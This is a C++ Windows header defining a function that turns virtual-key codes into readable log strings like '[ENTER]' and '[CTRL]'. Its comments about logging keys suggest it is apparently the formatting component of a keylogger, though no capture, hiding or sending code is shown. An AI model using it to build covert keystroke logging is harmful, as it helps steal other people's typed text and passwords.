#pragma once
#include <Windows.h>
#include <cstdio>
#include <cstring>

#define IS_ALNUM(k) (((k >= 65 && k <= 90) || (k >= 48 && k <= 57) || k == 32))


void key_translate(char* stroke, unsigned vk) {
	switch (vk) {
		// ignore - start
		case VK_LBUTTON:
		case VK_RBUTTON:
		case VK_MBUTTON:
		case VK_PRIOR:		// page up
		case VK_NEXT:		// page down
			stroke[0] = 0x00;
			return;
		// ignore - end
		

		// main - start
		case VK_BACK:	// backspace
			strcpy(stroke, "[<]");
			break;
		case VK_DELETE:
			strcpy(stroke, "[DEL]");
			break;
		case VK_TAB:
			strcpy(stroke, "[TAB]");
			break;
		case VK_RETURN:  // enter
			strcpy(stroke, "\n[ENTER]\n");
			break;
		case VK_SHIFT:
			strcpy(stroke, "[SHIFT]");
			break;
		case VK_CONTROL:
			strcpy(stroke, "[CTRL]");
			break;
		case VK_MENU:		// alt
			strcpy(stroke, "[ALT]");
			break;
		case VK_CAPITAL:  // capslock
			strcpy(stroke, "[CAPSLOCK]");
			break;
		case VK_ESCAPE:
			strcpy(stroke, "[ESC]");
			break;
		case VK_SPACE:
			strcpy(stroke, "[ ]");
			break;
		// main - end

		// arrows - start
		case VK_LEFT:
			strcpy(stroke, "[LEFT]");
			break;
		case VK_RIGHT:
			strcpy(stroke, "[RIGHT]");
			break;
		case VK_UP:
			strcpy(stroke, "[UP]");
			break;
		case VK_DOWN:
			strcpy(stroke, "[DOWN]");
			break;
		// arrow - end

		// numpad - start
		case VK_NUMPAD0:
			strcpy(stroke, "0");
			break;
		case VK_NUMPAD1:
			strcpy(stroke, "1");
			break;
		case VK_NUMPAD2:
			strcpy(stroke, "2");
			break;
		case VK_NUMPAD3:
			strcpy(stroke, "3");
			break;
		case VK_NUMPAD4:
			strcpy(stroke, "4");
			break;
		case VK_NUMPAD5:
			strcpy(stroke, "5");
			break;
		case VK_NUMPAD6:
			strcpy(stroke, "6");
			break;
		case VK_NUMPAD7:
			strcpy(stroke, "7");
			break;
		case VK_NUMPAD8:
			strcpy(stroke, "8");
			break;
		case VK_NUMPAD9:
			strcpy(stroke, "9");
			break;
		case VK_MULTIPLY:
			strcpy(stroke, "*");
			break;
		case VK_OEM_PLUS:
		case VK_ADD:
			strcpy(stroke, "+");
			break;
		case VK_DIVIDE:
			strcpy(stroke, "/");
			break;
		case VK_OEM_MINUS:
		case VK_SUBTRACT:
			strcpy(stroke, "-");
			break;
		case VK_OEM_PERIOD:
		case VK_DECIMAL:
			strcpy(stroke, ".");
			break;
		case VK_NUMLOCK:
			strcpy(stroke, "[NUMLOCK]");
			break;
		case VK_OEM_COMMA:
			strcpy(stroke, ",");
			break;
		// numpad - end

		// misc - start
		case VK_SNAPSHOT:  // screenshot
			strcpy(stroke, "[PRNTSCR]");
			break;
		case VK_LWIN:  //win keys
		case VK_RWIN:
			strcpy(stroke, "[WIN]");
			break;
		case VK_END:
			strcpy(stroke, "[END]");
			break;
		case VK_HOME:
			strcpy(stroke, "[HOME]");
			break;
		case VK_INSERT:
			strcpy(stroke, "[INS]");
			break;
		// misc - end
		default:
			if IS_ALNUM(vk) {
				stroke[0] = (char)vk;		// translate from ASCII num
				stroke[1] = 0x00;
			} else {
				sprintf(stroke, "[%#02x]", vk);	// unknown, log the VK
			}
	}
}
